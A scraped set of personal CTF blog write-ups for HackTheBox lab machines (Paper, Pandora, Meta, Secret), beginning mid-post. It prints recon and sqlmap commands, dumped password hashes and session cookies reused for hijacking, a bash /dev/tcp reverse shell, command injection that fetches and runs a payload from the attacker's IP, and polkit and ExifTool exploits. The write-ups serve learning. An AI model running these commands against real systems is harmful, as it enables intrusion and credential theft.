&quot;Host: FUZZ.paper.htb&quot; --sc 200 Nothing Web Nothing in the source code.Powered by centOS and apache phpThis is good, maybe I can read php files in this server nmapgobustergobuster dir -t 100 -x php -u http:&#x2F;&#x2F;paper.htb -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /manual (Status: 301) [Size: 232] –&gt; [http://paper.htb/manual/] gobuster dir -t 100 -x php -u http:&#x2F;&#x2F;paper.htb&#x2F;manual -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /misc (Status: 301) [Size: 237] –&gt; [http://paper.htb/manual/misc/]/images (Status: 301) [Size: 239] –&gt; [http://paper.htb/manual/images/]/faq (Status: 301) [Size: 236] –&gt; [http://paper.htb/manual/faq/]/programs (Status: 301) [Size: 241] –&gt; [http://paper.htb/manual/programs/]/howto (Status: 301) [Size: 238] –&gt; [http://paper.htb/manual/howto/]/developer (Status: 301) [Size: 242] –&gt; [http://paper.htb/manual/developer/]/style (Status: 301) [Size: 238] –&gt; [http://paper.htb/manual/style/]/ssl (Status: 301) [Size: 236] –&gt; [http://paper.htb/manual/ssl/]/platform (Status: 301) [Size: 241] –&gt; [http://paper.htb/manual/platform/]/mod (Status: 301) [Size: 236] –&gt; [http://paper.htb/manual/mod/]/LICENSE (Status: 200) [Size: 11358]/vhosts (Status: 301) [Size: 239] –&gt; [http://paper.htb/manual/vhosts/]/rewrite (Status: 301) [Size: 240] –&gt; [http://paper.htb/manual/rewrite/]/BUILDING (Status: 200) [Size: 102] Nothing interesting telnettelnet paper.htb 80 Trying 10.129.147.140…Connected to paper.htb.Escape character is ‘^]’.GET /../../../../../../../../../../../../../../../../../../../etc/apache2/apach2.conf HTTP/1.1 HTTP/1.1 400 Bad RequestDate: Sat, 05 Feb 2022 21:39:40 GMTServer: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9X-Backend-Server: office.paperContent-Length: 226Connection: closeContent-Type: text/html; charset=iso-8859-1 So we have office.paper, I’m gonna add it to my /etc/hosts Yesss!!!!! gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;office.paper -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /wp-content (Status: 301) [Size: 239] –&gt; [http://office.paper/wp-content/]/manual (Status: 301) [Size: 235] –&gt; [http://office.paper/manual/]/wp-includes (Status: 301) [Size: 240] –&gt; [http://office.paper/wp-includes/]/wp-admin (Status: 301) [Size: 237] –&gt; [http://office.paper/wp-admin/] It will be easy, it’s a workpress weebsite. And we have some potentiel user:prisonmikeJanMichaelNick There is only one WP user. wpscanwpscan -e u vp vt dbe --url http:&#x2F;&#x2F;office.paper The readme still here: http://office.paper/readme.htmlWordPress version 5.2.3 identified (Insecure, released on 2019-09-05).http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1We have 2 wp users: nick and prisonmike WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Postshttps://wpscan.com/vulnerability/9909Proof of Concept for “Wordpress &lt;=5.2.3: viewing unauthenticated posts” (CVE-2019-17671)https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/ http://office.paper/?static=1 test Micheal please remove the secret from drafts for gods sake! Hello employees of Blunder Tiffin, Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system. So, I kindly request you all to take your discussions from the public blog to a more private chat system. -Nick # Warning for Michael Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick Threat Level Midnight A MOTION PICTURE SCREENPLAY, WRITTEN AND DIRECTED BY MICHAEL SCOTT [INT:DAY] Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt…. # Secret Registration URL of new Employee chat system http:&#x2F;&#x2F;chat.office.paper&#x2F;register&#x2F;8qozr226AhkCHZdyY # I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick. # Also, stop looking at my drafts. Jeez! I have an another link, I have to add chat.office.paper to my hosts file.http://chat.office.paper/register/8qozr226AhkCHZdyY rocket chatThis CTF is so fun :DNOOO, GOD! NO, GOD, PLEASE, NO! NO! NO! I have something to do with the bot. I can’t upload files in the chat with the bot. This is interesting. recyclops list sale -rw-r–r– 1 dwight dwight 158 Sep 15 13:03 portfolio.txt recyclops list ..&#x2F;..&#x2F;..&#x2F;home&#x2F; total 0drwxr-xr-x. 3 root root 20 Jan 14 06:50 .dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..drwx—— 11 dwight dwight 294 Feb 5 14:46 dwight Maybe I can start an another command with ;Ahahahah!!!!Stop injecting OS commands! Maybe I can fetch the wp-config.php3. Files:eg: ‘recyclops get me the file test.txt’, or ‘recyclops could you send me the file src/test.php’ or just ‘recyclops file test.txt’ Get userrecyclops file ../../../home/dwight/hubot/.envexport ROCKETCHAT_PASSWORD=Queenofblad3s!23 I have to try this password with the user of the box.recyclops list ../../../home/total 8drwxr-xr-x. 3 root root 20 Jan 14 06:50 .dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..drwx—— 13 dwight dwight 4096 Feb 6 04:10 dwight ssh dwight@paper.htb get rootIn the dwight home we have a pk.sh file. #!&#x2F;bin&#x2F;bash # Set the name and display name userName&#x3D;&quot;hacked&quot; realName&#x3D;&quot;hacked&quot; # Set the account as an administrator accountType&#x3D;1 # Set the password hash for &#39;password&#39; and password hint password&#x3D;&#39;$5$WR3c6uwMGQZ&#x2F;JEZw$OlBVzagNJswkWrKRSuoh&#x2F;VCrZv183QpZL7sAeskcoTB&#39; passHint&#x3D;&quot;password&quot; # Check Polkit version polkitVersion&#x3D;$(systemctl status polkit.service | grep version | cut -d &quot; &quot; -f 9) if [[ &quot;$(apt list --installed 2&gt;&#x2F;dev&#x2F;null | grep polkit | grep -c 0.105-26)&quot; -ge 1 || &quot;$(yum list installed | grep polkit | grep -c 0.117-2)&quot; ]]; then echo &quot;[*] Vulnerable version of polkit found&quot; else echo &quot;[!] WARNING: Version of polkit might not vulnerable&quot; fi It will create a new user, hacked:password.He is checking the version of polkit too.I don’t put all the code, it’s too long, you have to see it yourself. .&#x2F;pk.sh Oh!!! pk is for polkit I got it now, but I don’t know why my pol.py don’t work, I’m using this exploit too. It was a cool box, I was a bit stuck at the beginning because I didn’t saw office.paper.htbThe bot was fun, you can do it in some python or bash bots on discord or IRC. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"cms","slug":"cms","permalink":"https://peanutstick.github.io/tags/cms/"}]},{"title":"CTF Pandora","slug":"CTF Pandora","date":"2022-02-05T07:30:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Pandora.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Pandora.html","excerpt":"","text":"/etc/hosts10.10.11.136 pandora.htb nmapnmap -sV -p- 10.10.11.136 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel wfuzzwfuzz --sc 200 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;pandora.htb&#x2F;FUZZ Nothing, same for the subdoimains. nmap n°2sudo nmap -sU --min-rate 100 pandora.htb PORT STATE SERVICE 161&#x2F;udp open snmp 19283&#x2F;udp closed keysrvr let’s see what we can do with snmp Matasploitmsfconsole use auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum show options set rhost 10.10.11.136 This is so cool, I can see every process, there is lot off hackers in the box. /usr/bin/host_check -u daniel -p HotelBabylon23 sshssh daniel@pandora.htb lse on My computer in my script directory python2.7 -m SimpleHTTPServer on the target wget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;lse.sh chmod +x lse.sh .&#x2F;lse.sh &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;pandora_backup --- pownkit root 960 0.0 0.2 236420 8932 ? Ssl 10:00 0:00 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkitd --no-debug I have to resist!!! pandora_backup I have to pwn matt first. linPEAShttps://github.com/carlospolop/PEASS-ng/tree/master/linPEAS I’m not supposed to use this exploit…I can do it to get both flags but it’m not a cheater. I have other open ports. Interesting files Mysql user: mysqlnmap -sV -p- 127.0.0.1 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) 3306&#x2F;tcp open mysql MySQL 5.5.5-10.3.32-MariaDB-0ubuntu0.20.04.1 I don’t have the creds webI wanted to browse pandora.panda.htb: it’s in my /etc/hosts but it’s not working, so tryed to do it via ssh with curl. curl pandora.panda.htb Same problem, let’s see his /etc/hosts daniel@pandora:&#x2F;tmp&#x2F;dir$ cat &#x2F;etc&#x2F;hosts 127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb 127.0.1.1 pandora 127.0.0.1 pandora is the website I saw on the port 80,I think 127.0.0.1 work only on localhost. daniel@pandora:&#x2F;tmp&#x2F;dir$ curl pandora.pandora.htb &lt;meta HTTP-EQUIV&#x3D;&quot;REFRESH&quot; content&#x3D;&quot;0; url&#x3D;&#x2F;pandora_console&#x2F;&quot;&gt; Yesss!!!!Now I have to find a way to se in on my browser. Web tunnelinghttps://www.it-connect.fr/chapitres/tunneling-ssh/It’s french but it’s good! ssh -f daniel@pandora.htb -L 2500:localhost:80 -N Boom! Where is the password… what is the username…(╯°□°）╯︵ ┻━┻) Oh no I have to be fast. Connnect with danielI was trying to connect with daniel.Ihave this error: It’s good, I have to use the API. Browsing the filesIn /var/www/pandora/pandora_console cat pandoradb.sql |grep pass `plugin_pass` text, `password` varchar(45) default '', `password` text, `snmp_auth_pass` varchar(255) NOT NULL default '', `snmp_privacy_pass` varchar(255) NOT NULL default '', `plugin_pass` text, `password` varchar(45) default NULL, `force_change_pass` tinyint(1) unsigned NOT NULL default 0, `last_pass_change` DATETIME NOT NULL DEFAULT 0, `ehorus_user_level_pass` VARCHAR(45), -- Table `treset_pass_history` CREATE TABLE IF NOT EXISTS `treset_pass_history` ( -- \"pass_opt\" are deprecated for the 5.1. `pass_opt` varchar(50) default '', `pass` varchar(100) NOT NULL default '', `is_password_type` tinyint(1) NOT NULL default 0, -- Table `tpassword_history` CREATE TABLE IF NOT EXISTS `tpassword_history` ( `id_pass` int(10) unsigned NOT NULL auto_increment, `password` varchar(45) default NULL, PRIMARY KEY (`id_pass`) `plugin_pass` text default '', `password` varchar(100) default '', `password` varchar(100) default '', `dbpass` text, `meta_dbpass` text, `api_password` text NOT NULL, CREATE TABLE IF NOT EXISTS `treset_pass` ( cat DB_Dockerfile FROM mysql:5.5 MAINTAINER Pandora FMS Team &lt;info@pandorafms.com&gt; WORKDIR &#x2F;pandorafms&#x2F;pandora_console ADD pandoradb.sql &#x2F;docker-entrypoint-initdb.d ADD pandoradb_data.sql &#x2F;docker-entrypoint-initdb.d RUN chown mysql &#x2F;docker-entrypoint-initdb.d ENV MYSQL_DATABASE&#x3D;pandora RUN echo &quot; \\n\\ sed -i \\&quot;1iUSE \\$MYSQL_DATABASE\\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb.sql \\n\\ sed -i \\&quot;1iUSE \\$MYSQL_DATABASE\\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb_data.sql \\n\\ &quot; &gt;&gt; &#x2F;docker-entrypoint-initdb.d&#x2F;create_pandoradb.sh Dbmane=”pandora”Table=”tpassword_history”This website show where we can exploit.https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained sqlmapI don’t use sqlmap very often, that’s why I had lot of trouble. sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php&quot; -D pandora [20:44:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter &#39;id&#39; in &#39;www.site.com&#x2F;index.php?id&#x3D;1&#39;). You are advised to rerun with &#39;--crawl&#x3D;2&#39; sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?id&#x3D;&#39;&#39;&quot; -D pandora --tables [20:45:33] [WARNING] GET parameter &#39;id&#39; does not seem to be injectable Now I have to find out what I have to use instead if ‘id’. sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora [20:47:42] [WARNING] potential permission problems detected (&#39;Access denied&#39;) I have an another error, it’s good.This is a cheat sheet:https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora -T tpassword_history --dump +---------+---------+---------------------+----------------------------------+---------------------+ | id_pass | id_user | date_end | password | date_begin | +---------+---------+---------------------+----------------------------------+---------------------+ | 1 | matt | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 | | 2 | daniel | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 | +---------+---------+---------------------+----------------------------------+---------------------+ list of tablessqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora --tables [178 tables] +------------------------------------+ | taddress | | taddress_agent | | tagent_access | | tagent_custom_data | | tagent_custom_fields | | tagent_custom_fields_filter | | tagent_module_inventory | | tagent_module_log | | tagent_repository | | tagent_secondary_group | | tagente | | tagente_datos | | tagente_datos_inc | | tagente_datos_inventory | | tagente_datos_log4x | | tagente_datos_string | | tagente_estado | | tagente_modulo | | talert_actions | | talert_commands | | talert_snmp | | talert_snmp_action | | talert_special_days | | talert_template_module_actions | | talert_template_modules | | talert_templates | | tattachment | | tautoconfig | | tautoconfig_actions | | tautoconfig_rules | | tcategory | | tcluster | | tcluster_agent | | tcluster_item | | tcollection | | tconfig | | tconfig_os | | tcontainer | | tcontainer_item | | tcredential_store | | tdashboard | | tdatabase | | tdeployment_hosts | | tevent_alert | | tevent_alert_action | | tevent_custom_field | | tevent_extended | | tevent_filter | | tevent_response | | tevent_rule | | tevento | | textension_translate_string | | tfiles_repo | | tfiles_repo_group | | tgis_data_history | | tgis_data_status | | tgis_map | | tgis_map_connection | | tgis_map_has_tgis_map_con | | tgis_map_layer | | tgis_map_layer_groups | | tgis_map_layer_has_tagente | | tgraph | | tgraph_source | | tgraph_source_template | | tgraph_template | | tgroup_stat | | tgrupo | | tincidencia | | titem | | tlanguage | | tlayout | | tlayout_data | | tlayout_template | | tlayout_template_data | | tlink | | tlocal_component | | tlog_graph_models | | tmap | | tmensajes | | tmetaconsole_agent | | tmetaconsole_agent_secondary_group | | tmetaconsole_event | | tmetaconsole_event_history | | tmetaconsole_setup | | tmigration_module_queue | | tmigration_queue | | tmodule | | tmodule_group | | tmodule_inventory | | tmodule_relationship | | tmodule_synth | | tnetflow_filter | | tnetflow_report | | tnetflow_report_content | | tnetwork_component | | tnetwork_component_group | | tnetwork_map | | tnetwork_matrix | | tnetwork_profile | | tnetwork_profile_component | | tnetworkmap_ent_rel_nodes | | tnetworkmap_enterprise | | tnetworkmap_enterprise_nodes | | tnews | | tnota | | tnotification_group | | tnotification_source | | tnotification_source_group | | tnotification_source_group_user | | tnotification_source_user | | tnotification_user | | torigen | | tpassword_history | | tperfil | | tphase | | tplanned_downtime | | tplanned_downtime_agents | | tplanned_downtime_modules | | tplugin | | tpolicies | | tpolicy_agents | | tpolicy_alerts | | tpolicy_alerts_actions | | tpolicy_collections | | tpolicy_groups | | tpolicy_modules | | tpolicy_modules_inventory | | tpolicy_plugins | | tpolicy_queue | | tprofile_view | | tprovisioning | | tprovisioning_rules | | trecon_script | | trecon_task | | trel_item | | tremote_command | | tremote_command_target | | treport | | treport_content | | treport_content_item | | treport_content_item_temp | | treport_content_sla_com_temp | | treport_content_sla_combined | | treport_content_template | | treport_custom_sql | | treport_template | | treset_pass | | treset_pass_history | | tserver | | tserver_export | | tserver_export_data | | tservice | | tservice_element | | tsesion | | tsesion_extended | | tsessions_php | | tskin | | tsnmp_filter | | ttag | | ttag_module | | ttag_policy_module | | ttipo_modulo | | ttransaction | | ttrap | | ttrap_custom_values | | tupdate | | tupdate_journal | | tupdate_package | | tupdate_settings | | tuser_double_auth | | tuser_task | | tuser_task_scheduled | | tusuario | | tusuario_perfil | | tvisual_console_elements_cache | | twidget | | twidget_dashboard | +------------------------------------+ sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora -T tsessions_php --dump +----------------------------+------------------------------------------------------+-------------+ | id_session | data | last_active | +----------------------------+------------------------------------------------------+-------------+ | 07ou61d2jsi3087a9jg12s3m1k | NULL | 1644502695 | | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;; | 1638783555 | | 0ahul7feb1l9db7ffp8d25sjba | NULL | 1638789018 | | 1t2n71opaqeoausmhaqk277c21 | id_usuario|s:6:&quot;daniel&quot;; | 1644502477 | | 1um23if7s531kqf5da14kf5lvm | NULL | 1638792211 | | 2e25c62vc3odbppmg6pjbf9bum | NULL | 1638786129 | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;; | 1638540332 | | 3fq6hl9r8kbadgq6r5bfjmojm5 | NULL | 1644502325 | | 3me2jjab4atfa5f8106iklh4fc | NULL | 1638795380 | | 4f51mju7kcuonuqor3876n8o02 | NULL | 1638786842 | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;; | 1638535373 | | 59qae699l0971h13qmbpqahlls | NULL | 1638787305 | | 5fihkihbip2jioll1a8mcsmp6j | NULL | 1638792685 | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;; | 1638281946 | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;; | 1641195617 | | 81f3uet7p3esgiq02d4cjj48rc | NULL | 1623957150 | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;; | 1638446321 | | 8uiokruc91od5tphgekpsau4lp | alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644502812 | | 8upeameujo9nhki3ps0fu32cgd | NULL | 1638787267 | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;; | 1638881787 | | a3a49kc938u7od6e6mlip1ej80 | NULL | 1638795315 | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;; | 1638881664 | | cojb6rgubs18ipb35b3f6hf0vp | NULL | 1638787213 | | d0carbrks2lvmb90ergj7jv6po | NULL | 1638786277 | | d0h8gpqrh99ur3pfcb53vqak5e | NULL | 1644513572 | | elks2rkjdnk8f001jqbkinael0 | NULL | 1644513405 | | eqsc2gjr37g0ug1q4qdk3rabh4 | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644502437 | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;; | 1641200284 | | fikt9p6i78no7aofn74rr71m85 | NULL | 1638786504 | | fqd96rcv4ecuqs409n5qsleufi | NULL | 1638786762 | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;; | 1638783230 | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644512890 | | gf40pukfdinc63nm5lkroidde6 | NULL | 1638786349 | | h1ge39342hcid93s3ghk0nhl3c | NULL | 1644502501 | | heasjj8c48ikjlvsf1uhonfesv | NULL | 1638540345 | | hif1pavjlks18e7oqgu8bmvhis | NULL | 1644513371 | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;; | 1638168492 | | j85l7a3q010b3ul6sv2eh6amo6 | NULL | 1644502455 | | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;; | 1638456173 | | kp90bu1mlclbaenaljem590ik3 | NULL | 1638787808 | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | 1638796348 | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;; | 1638540482 | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;; | 1637667827 | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;; | 1638168416 | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | 1638787723 | | r097jr6k9s7k166vkvaj17na1u | NULL | 1638787677 | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;; | 1638889082 | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;; | 1638547193 | | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:&quot;daniel&quot;; | 1638793297 | | vntmpokca9aee53q48op3mesqs | id_usuario|s:6:&quot;daniel&quot;; | 1644502107 | +----------------------------+------------------------------------------------------+-------------+ | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:”matt”;alert_msg|a:0:{}new_chat|b:0; You have to past it in the cookie. Refresh the page..And now you are matt, you can also take the admin cookie but someone else is playing with it,so it’s not working. I have to kill them. Oh, sorry ppl, it’s not working.Hummm, it’s working because I was logged in as admin, but I removed the cookie.One of them is logged as admin, he have to finish the box first I thinkSomeone is using chisel, I have to try this tool too.I think it’s like my tunnel ssh. https://github.com/jpillora/chiselOk I will try later. As admin.Now I’m admin on the machine, I had to wait 2 hours. Download the revershellI’v downloaded a reversshell here:https://github.com/pentestmonkey/php-reverse-shell $ip &#x3D; &#39;10.10.15.27&#39;; &#x2F;&#x2F; CHANGE THIS $port &#x3D; 4648; &#x2F;&#x2F; CHANGE THIS Zip itzip -r php-reverse-shell.zip php-reverse-shell.php netcatnc -lvp 4648 Upload it I’m matt pandora_backupI can’t be admin on the webpage, it’s buggy.I leave this CTF. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"pivot","slug":"pivot","permalink":"https://peanutstick.github.io/tags/pivot/"}]},{"title":"CTF Meta","slug":"CTF Meta","date":"2022-02-02T09:15:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Meta.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Meta.html","excerpt":"","text":"hosts/etc/hosts10.10.11.140 artcorp.htb rustscanrustscan -a meta.htb --range 1-65000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack wfuzzNothing with the dir listingBut with the sub listing I have this:https://infinitelogins.com/2020/09/02/bruteforcing-subdomains-wfuzz/ wfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains.lst -u &#39;http:&#x2F;&#x2F;artcorp.htb&#39; -H &quot;Host: FUZZ.artcorp.htb&quot; --hw 9000 |grep 200 dev01.artcorp.htb.I add it to my /etc/hosts. It’s an exif tool, to see the metadatas. Exploit exiffhttps://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/I found this website who can give cool infos.CVE-2021-22204https://github.com/convisolabs/CVE-2021-22204-exiftool Install exiftoolhttps://exiftool.org/install.html Install djvulibresudo pacman -S djvulibre Downloadgit clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git Edit the fileip = ‘10.10.15.22’port = ‘4444’ Open the listenernc -nlvp 4444 BOOMMMMI upload the file and the shell pop. Exploit pwnkitIt’s not working. I think I have to get the user first.should also do a directory with all my tools and open the python http server when I need them. I need th go to sleep… ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Secret","slug":"CTF Secret","date":"2022-01-31T06:29:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Secret.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Secret.html","excerpt":"","text":"/etc/hosts10.10.11.120 secret.htb nmapnmap -sV -p- 10.10.11.120 nmap is too slow I will try rust rustscanhttps://github.com/RustScan/RustScan rustscan -a secret.htb --range 1-10000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 3000&#x2F;tcp open ppp syn-ack nmap port 3000nmap -sV secret.htb -p 3000 PORT STATE SERVICE VERSION 3000&#x2F;tcp open http Node.js (Express middleware) fuzzffuf -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;secret.htb&#x2F;FUZZ docs [Status: 200, Size: 20720, Words: 6752, Lines: 487] api [Status: 200, Size: 93, Words: 12, Lines: 1] Docs [Status: 200, Size: 20720, Words: 6752, Lines: 487] API [Status: 200, Size: 93, Words: 12, Lines: 1] DOCS [Status: 200, Size: 20720, Words: 6752, Lines: 487] node.js api APIRegister I’m gonna use a plugin to post my requests, you can do it with curl. Login I have a token. Token This is mu token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ.s-jTYtdx1chd9m2XymrA_tDefcwOciKT8UHNS1H4qHk I have to decode the second part. echo &quot;eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ&quot; | base64 --decode &#123;&quot;_id&quot;:&quot;61f6ce5c3b1815046318f960&quot;,&quot;name&quot;:&quot;peanut&quot;,&quot;email&quot;:&quot;root@root.com&quot;,&quot;iat&quot;:1643564766&#125;base64: entrée incorrecte Maybe I can recreate the payload withdasith Download file http://secret.htb:3000/download/files.zip See historyhttps://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History git log -p -2 -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE+TOKEN_SECRET = secret And the more important.href=”https://www.youtube.com/watch?v=dQw4w9WgXcQ”&gt;secure! this has everything to make ur project secure. Create the token you have to change the name and set the secret in VERIFY SIGNATURE. Login as admin … where is my fucking FLag!!! In the git directory I have something to do with logs, but I don’t know how to add a parameter.https://www.codegrepper.com/code-examples/javascript/req+query+params+expressNow I know lol. Add the parameter. Exploitcreate the payloadrs.sh bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.22&#x2F;4846 0&gt;&amp;1 Listennc -lvp 4846 Create a http server to download the payload.python2.7 -m SimpleHTTPServer Download the payloadhttp://secret.htb:3000/api/logs?file=;wget http://10.10.15.22:8000/rs.sh Yeah! Execute the payloadhttp://secret.htb:3000/api/logs?file=;bash rs.sh I have a shell as dashith. Get rootDownload the exploitOn my computerwget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;joeammond&#x2F;CVE-2021-4034&#x2F;main&#x2F;CVE-2021-4034.py On the targetwget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;pol.py Exploitpython3 pol.py It’s not finishThis exploit is a cheat code, it’s too easy and I want to learn. Smart enumwget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;lse.sh sh lse.sh LSE Version: 3.9 User: dasith User ID: 1000 Password: none Home: &#x2F;home&#x2F;dasith Path: &#x2F;usr&#x2F;bin:&#x2F;bin umask: 0022 Hostname: secret Linux: 5.4.0-89-generic Distribution: Ubuntu 20.04.3 LTS Architecture: x86_64 